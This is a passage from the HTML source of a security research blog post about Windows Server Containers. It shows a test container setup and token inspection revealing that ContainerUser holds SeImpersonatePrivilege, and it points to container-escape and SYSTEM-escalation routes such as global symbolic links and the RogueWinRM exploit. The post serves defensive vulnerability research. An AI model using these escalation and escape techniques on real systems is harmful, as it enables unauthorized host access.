href="https://unit42.paloaltonetworks.com/author/daniel-prizmant/"&gt;Daniel Prizmant&lt;/a&gt;&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;span&gt;&amp;nbsp;a researcher at Palo Alto Networks&lt;/span&gt;&lt;span&gt;&amp;nbsp;on some details around Windows object manager symbolic links. Daniel was doing research into &lt;/span&gt;&lt;span&gt;Windows containers&lt;/span&gt;&lt;span&gt;, and wanted help on a feature which allows symbolic links to be marked as global which allows them to reference objects outside the server silo. I recommend reading Daniel&amp;rsquo;s &lt;/span&gt;&lt;span class="c23"&gt;&lt;a class="c311" href="https://unit42.paloaltonetworks.com/what-i-learned-from-reverse-engineering-windows-containers/"&gt;blog post&lt;/a&gt;&lt;/span&gt;&lt;span class="c11"&gt;&amp;nbsp;for more in-depth information about Windows containers.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;Knowing a little bit about symbolic links I was able to help fill in some details and usage. About seven months later Daniel released a second &lt;/span&gt;&lt;span class="c23"&gt;&lt;a class="c311" href="https://unit42.paloaltonetworks.com/windows-server-containers-vulnerabilities/"&gt;blog post&lt;/a&gt;&lt;/span&gt;&lt;span class="c11"&gt;, this time describing how to use global symbolic links to escape a server silo Windows container. The result of the exploit is the user in the container can access resources outside of the container, such as files.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;The global symbolic link feature needs &lt;/span&gt;&lt;span class="c2"&gt;SeTcbPrivilege&lt;/span&gt;&lt;span&gt;&amp;nbsp;to be enabled, which can only be accessed from SYSTEM. The exploit therefore involved injecting into a system process from the default administrator user and running the exploit from there. Based on the blog post, I thought it could be done easier without injection. You could impersonate a &lt;/span&gt;&lt;span class="c2"&gt;SYSTEM &lt;/span&gt;&lt;span&gt;token and do the exploit all in process. I wrote a simple proof-of-concept in PowerShell and put it up on &lt;/span&gt;&lt;span class="c23"&gt;&lt;a class="c311" href="https://gist.github.com/tyranid/bf8a890e615d310c7193901a1c7e0e3a"&gt;Github&lt;/a&gt;&lt;/span&gt;&lt;span class="c11"&gt;. &lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;Fast forward another few months and a Googler reached out to ask me some questions about Windows Server Containers. Another researcher at Palo Alto Networks had reported to Google Cloud that &lt;/span&gt;&lt;span&gt;Google Kubernetes Engine (GKE)&lt;/span&gt;&lt;span class="c11"&gt;&amp;nbsp;was vulnerable to the issue Daniel had identified. Google Cloud was using Windows Server Containers to run Kubernetes, so it was possible to escape the container and access the host, which was not supposed to be accessible. &lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;Microsoft had not patched the issue and it was still exploitable. They hadn&amp;rsquo;t patched it because Microsoft does not consider these issues to be serviceable. Therefore the GKE team was looking for mitigations. One proposed mitigation was to enforce the containers to run under the &lt;/span&gt;&lt;span class="c2"&gt;ContainerUser &lt;/span&gt;&lt;span&gt;account instead of the &lt;/span&gt;&lt;span class="c2"&gt;ContainerAdministrator&lt;/span&gt;&lt;span class="c11"&gt;. As the reported issue only works when running as an administrator that would seem to be sufficient. &lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;However, I wasn&amp;rsquo;t convinced there weren&amp;#39;t similar vulnerabilities which could be exploited from a non-administrator user. Therefore I decided to do my own research into Windows Server Containers to determine if the guidance of using &lt;/span&gt;&lt;span class="c2"&gt;ContainerUser &lt;/span&gt;&lt;span class="c11"&gt;would really eliminate the risks.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c11"&gt;While I wasn&amp;rsquo;t expecting MS to fix anything I found it would at least allow me to provide internal feedback to the GKE team so they might be able to better mitigate the issues. It also establishes a rough baseline of the risks involved in using Windows Server Containers. It&amp;rsquo;s known to be problematic, but how problematic?&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c12" id="h.7ymdzmqeqrfv"&gt;&lt;span class="c22 c34"&gt;Research Process&lt;/span&gt;&lt;/h2&gt; &lt;p class="c3"&gt;&lt;span class="c11"&gt;The first step was to get some code running in a representative container. Nothing that had been reported was specific to GKE, so I made the assumption I could just run a local Windows Server Container. &lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;Setting up your own server silo from scratch is undocumented and almost certainly unnecessary. When you enable the Container support feature in Windows, the Hyper-V Host Compute Service is installed. This takes care of setting up both Hyper-V and process isolated containers. The API to interact with this service isn&amp;rsquo;t officially documented, however Microsoft has provided public wrappers (with scant documentation), for example this is the &lt;/span&gt;&lt;span class="c23"&gt;&lt;a class="c311" href="https://github.com/microsoft/hcsshim"&gt;Go wrapper&lt;/a&gt;&lt;/span&gt;&lt;span class="c11"&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;Realistically it&amp;rsquo;s best to just use &lt;/span&gt;&lt;span class="c23"&gt;&lt;a class="c311" href="https://www.docker.com/products/docker-desktop"&gt;Docker&lt;/a&gt;&lt;/span&gt;&lt;span class="c11"&gt;&amp;nbsp;which takes the MS provided Go wrapper and implements the more familiar Docker CLI. While there&amp;rsquo;s likely to be Docker-specific escapes, the core functionality of a Windows Docker container is all provided by Microsoft so would be in scope. Note, there are two versions of Docker: Enterprise which is only for server systems and Desktop. I primarily used Desktop for convenience.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;As an aside, MSRC does not count any issue as crossing a security boundary where being a member of the &lt;/span&gt;&lt;span class="c2 c35"&gt;Hyper-V Administrators&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;group is a prerequisite. Using the Hyper-V Host Compute Service requires membership of the &lt;/span&gt;&lt;span class="c2 c35"&gt;Hyper-V Administrators&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;group. However Docker runs at sufficient privilege to not need the user to be a member of the group. Instead access to Docker is gated by membership of the separate &lt;/span&gt;&lt;span class="c2 c35"&gt;docker-users&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;group. If you get code running under a non-administrator user that has membership of the&lt;/span&gt;&lt;span class="c2 c35"&gt;&amp;nbsp;docker-users&lt;/span&gt;&lt;span class="c40 c2"&gt;&amp;nbsp;group you can use that to get full administrator privileges by abusing Docker&amp;rsquo;s server silo support.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c11"&gt;Fortunately for me most Windows Docker images come with .NET and PowerShell installed so I could use my existing toolset. I wrote a simple docker file containing the following:&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.e07c9d9bc031871a4f6feed90c7439c5a2f2a923"&gt;&lt;/a&gt;&lt;a id="t.0"&gt;&lt;/a&gt;&lt;table class="c13"&gt;&lt;tbody&gt;&lt;tr class="c9"&gt;&lt;td class="c24" colspan="1" rowspan="1"&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;FROM mcr.microsoft.com/windows/servercore:20H2&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;USER ContainerUser&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;COPY NtObjectManager c:/NtObjectManager &lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;CMD [ &amp;quot;powershell&amp;quot;, &amp;quot;-noexit&amp;quot;, &amp;quot;-command&amp;quot;, \&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;&amp;nbsp; &amp;quot;Import-Module c:/NtObjectManager/NtObjectManager.psd1&amp;quot; ]&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;This docker file will download a Windows Server Core 20H2 container image from the &lt;/span&gt;&lt;span class="c23"&gt;&lt;a class="c311" href="https://github.com/microsoft/containerregistry"&gt;Microsoft Container Registry&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, copy in my &lt;/span&gt;&lt;span class="c2"&gt;NtObjectManager &lt;/span&gt;&lt;span&gt;PowerShell module and then set up a command to load that module on startup. I also specified that the PowerShell process would run as the user &lt;/span&gt;&lt;span class="c2"&gt;ContainerUser&lt;/span&gt;&lt;span&gt;&amp;nbsp;so that I could test the mitigation assumptions. If you don&amp;rsquo;t specify a user it&amp;rsquo;ll run as &lt;/span&gt;&lt;span class="c2"&gt;ContainerAdministrator &lt;/span&gt;&lt;span class="c11"&gt;by default.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2 c40"&gt;Note, when using process isolation mode the container image version must match the host OS. This is because the kernel is shared between the host and the container and any mismatch between the user-mode code and the kernel could result in compatibility issues. Therefore if you&amp;rsquo;re trying to replicate this you might need to change the name for the container image.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;Create a directory and copy the contents of the docker file to the filename &lt;/span&gt;&lt;span class="c2"&gt;dockerfile&lt;/span&gt;&lt;span&gt;&amp;nbsp;in that directory. Also copy in a copy of my &lt;/span&gt;&lt;span class="c23"&gt;&lt;a class="c311" href="https://www.powershellgallery.com/packages/NtObjectManager/1.1.30"&gt;PowerShell module&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;into the same directory under the &lt;/span&gt;&lt;span class="c2"&gt;NtObjectManager &lt;/span&gt;&lt;span class="c11"&gt;directory. Then in a command prompt in that directory run the following commands to build and run the container.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.2fd7732a71aa7fde31f1ab43520d1c7ddece71c4"&gt;&lt;/a&gt;&lt;a id="t.1"&gt;&lt;/a&gt;&lt;table class="c13"&gt;&lt;tbody&gt;&lt;tr class="c9"&gt;&lt;td class="c24" colspan="1" rowspan="1"&gt; &lt;p class="c7"&gt;&lt;span class="c8"&gt;C:\container&amp;gt; &lt;/span&gt;&lt;span class="c22 c30"&gt;docker build -t test_image .&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;Step 1/4 : FROM mcr.microsoft.com/windows/servercore:20H2&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;&amp;nbsp;---&amp;gt; b29adf5cd4f0&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;Step 2/4 : USER ContainerUser&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;&amp;nbsp;---&amp;gt; Running in ac03df015872&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;Removing intermediate container ac03df015872&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;&amp;nbsp;---&amp;gt; 31b9978b5f34&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;Step 3/4 : COPY NtObjectManager c:/NtObjectManager&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;&amp;nbsp;---&amp;gt; fa42b3e6a37f&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;Step 4/4 : CMD [ &amp;quot;powershell&amp;quot;, &amp;quot;-noexit&amp;quot;, &amp;quot;-command&amp;quot;, &amp;nbsp; &amp;quot;Import-Module c:/NtObjectManager/NtObjectManager.psd1&amp;quot; ]&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;&amp;nbsp;---&amp;gt; Running in 86cad2271d38&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;Removing intermediate container 86cad2271d38&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;&amp;nbsp;---&amp;gt; e7d150417261&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;Successfully built e7d150417261&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;Successfully tagged test_image:latest&lt;/span&gt;&lt;/p&gt; &lt;p class="c7 c4"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c8"&gt;C:\container&amp;gt; &lt;/span&gt;&lt;span class="c22 c30"&gt;docker run --isolation=process -it test_image&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;PS&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;I wanted to run code using process isolation rather than in Hyper-V isolation, so I needed to specify the &lt;/span&gt;&lt;span class="c2"&gt;--isolation=process&lt;/span&gt;&lt;span class="c11"&gt;&amp;nbsp;argument. This would allow me to more easily see system interactions as I could directly debug container processes if needed. For example, you can use Process Monitor to monitor file and registry access. Docker Enterprise uses process isolation by default, whereas Desktop uses Hyper-V isolation. &lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;I now&lt;/span&gt;&lt;span&gt;&amp;nbsp;had a PowerShell console running inside the container as &lt;/span&gt;&lt;span class="c2"&gt;ContainerUser&lt;/span&gt;&lt;span&gt;. A quick way to check that it was successful is to try and find the &lt;/span&gt;&lt;span class="c2"&gt;CExecSvc &lt;/span&gt;&lt;span class="c11"&gt;process, which is the Container Execution Agent service. This service is used to spawn your initial PowerShell console.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.4abdaa6170995b53e099bfa9a436f20f03c1b016"&gt;&lt;/a&gt;&lt;a id="t.2"&gt;&lt;/a&gt;&lt;table class="c13"&gt;&lt;tbody&gt;&lt;tr class="c9"&gt;&lt;td class="c24" colspan="1" rowspan="1"&gt; &lt;p class="c7"&gt;&lt;span class="c8"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c0"&gt;Get-Process&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c17 c32"&gt;-Name&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;CExecSvc&lt;/span&gt;&lt;/p&gt; &lt;p class="c7 c4"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;Handles &amp;nbsp;NPM(K) &amp;nbsp; &amp;nbsp;PM(K) &amp;nbsp; &amp;nbsp; &amp;nbsp;WS(K) &amp;nbsp; &amp;nbsp; CPU(s) &amp;nbsp; &amp;nbsp; Id &amp;nbsp;SI ProcessName&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;------- &amp;nbsp;------ &amp;nbsp; &amp;nbsp;----- &amp;nbsp; &amp;nbsp; &amp;nbsp;----- &amp;nbsp; &amp;nbsp; ------ &amp;nbsp; &amp;nbsp; -- &amp;nbsp;-- -----------&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;86 &amp;nbsp; &amp;nbsp; &amp;nbsp; 6 &amp;nbsp; &amp;nbsp; 1044 &amp;nbsp; &amp;nbsp; &amp;nbsp; 5020 &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;4560 &amp;nbsp; 6 CExecSvc&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;With a running container it was time to start poking around to see what&amp;rsquo;s available. The first thing I did was dump the &lt;/span&gt;&lt;span class="c2"&gt;ContainerUser&amp;rsquo;s&lt;/span&gt;&lt;span&gt;&amp;nbsp;token just to see what groups and privileges were assigned. You can use the &lt;/span&gt;&lt;span class="c2"&gt;Show-NtTokenEffective&lt;/span&gt;&lt;span class="c11"&gt;&amp;nbsp;command to do that.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.fa8fbc68d39b0db004d0c7e1d17444209b07a00f"&gt;&lt;/a&gt;&lt;a id="t.3"&gt;&lt;/a&gt;&lt;table class="c13"&gt;&lt;tbody&gt;&lt;tr class="c9"&gt;&lt;td class="c24" colspan="1" rowspan="1"&gt; &lt;p class="c3"&gt;&lt;span class="c8"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c0"&gt;Show-NtTokenEffective&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c17 c32"&gt;-User&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c17 c32"&gt;-Group&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c8 c17 c32"&gt;-Privilege&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;USER INFORMATION&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;----------------&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;Name &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Sid&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;---- &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ---&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;User Manager\ContainerUser S-1-5-93-2-2&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;GROUP SID INFORMATION&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;-----------------&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;Name &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Attributes&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;---- &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ----------&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;Mandatory Label\High Mandatory Level &amp;nbsp; Integrity, ...&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;Everyone &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Mandatory, ...&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;BUILTIN\Users &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;Mandatory, ...&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;NT AUTHORITY\SERVICE &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Mandatory, ...&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;CONSOLE LOGON &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;Mandatory, ...&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;NT AUTHORITY\Authenticated Users &amp;nbsp; &amp;nbsp; &amp;nbsp; Mandatory, ...&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;NT AUTHORITY\This Organization &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Mandatory, ...&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;NT AUTHORITY\LogonSessionId_0_10357759 Mandatory, ...&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;LOCAL &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;Mandatory, ...&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;User Manager\AllContainers &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; Mandatory, ...&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;PRIVILEGE INFORMATION&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;---------------------&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;Name &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;Luid &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;Enabled&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;---- &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;---- &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;-------&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;SeChangeNotifyPrivilege &amp;nbsp; &amp;nbsp; &amp;nbsp; 00000000-00000017 True&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c22 c30"&gt;SeImpersonatePrivilege &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;00000000-0000001D True&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;SeCreateGlobalPrivilege &amp;nbsp; &amp;nbsp; &amp;nbsp; 00000000-0000001E True&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;SeIncreaseWorkingSetPrivilege 00000000-00000021 False&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;The groups didn&amp;rsquo;t seem that interesting, however looking at the privileges we have &lt;/span&gt;&lt;span class="c2"&gt;SeImpersonatePrivilege&lt;/span&gt;&lt;span&gt;. If you have this privilege you can impersonate any other user on the system including administrators. MSRC considers having &lt;/span&gt;&lt;span class="c2"&gt;SeImpersonatePrivilege &lt;/span&gt;&lt;span&gt;as administrator equivalent, meaning if you have it you can assume you can get to administrator. Seems &lt;/span&gt;&lt;span class="c2"&gt;ContainerUser &lt;/span&gt;&lt;span class="c11"&gt;is not quite as normal as it should be.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;That was a very bad (or good) start to my research. T&lt;/span&gt;&lt;span&gt;he prior assumption was that running as &lt;/span&gt;&lt;span class="c2"&gt;ContainerUser &lt;/span&gt;&lt;span&gt;would not grant administrator privileges, and therefore the global symbolic link issue couldn&amp;rsquo;t be directly exploited. However that turns out to not be the case in practice.&lt;/span&gt;&lt;span&gt;&amp;nbsp;As an example you can use the public &lt;/span&gt;&lt;span class="c23"&gt;&lt;a class="c311" href="https://github.com/antonioCoco/RogueWinRM"&gt;RogueWinRM exploit&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;to get a &lt;/span&gt;&lt;span class="c2"&gt;SYSTEM&lt;/span&gt;&lt;span&gt;&amp;nbsp;token as long as WinRM isn&amp;rsquo;t enabled, which is the case on most Windows container images. There are no doubt other less well known techniques to achieve the same thing. The code which creates the user account is in &lt;/span&gt;&lt;span class="c2"&gt;CExecSvc,&lt;/span&gt;&lt;span class="c11"&gt;&amp;nbsp;which is code owned by Microsoft and is not specific to Docker.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;NextI used the &lt;/span&gt;&lt;span class="c2"&gt;NtObject&lt;/span&gt;&lt;span&gt;&amp;nbsp;drive provider to list the object manager namespace. For example checking the &lt;/span&gt;&lt;span class="c2"&gt;Device &lt;/span&gt;&lt;span class="c11"&gt;directory shows what device objects are available.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3 c4"&gt;&lt;span class="c11"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.67f90f317c479b2d7a29f007b5b1cf274293b216"&gt;&lt;/a&gt;&lt;a id="t.4"&gt;&lt;/a&gt;&lt;table class="c13"&gt;&lt;tbody&gt;&lt;tr class="c9"&gt;&lt;td class="c24" colspan="1" rowspan="1"&gt; &lt;p class="c7"&gt;&lt;span class="c8"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c0"&gt;ls&lt;/span&gt;&lt;span class="c8 c17"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c6"&gt;NtObject:\Device&lt;/span&gt;&lt;/p&gt; &lt;p class="c7 c4"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span class="c1"&gt;Name &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;TypeName&lt;/span&gt;&lt;/p&gt; &lt;p class="c7"&gt;&lt;span 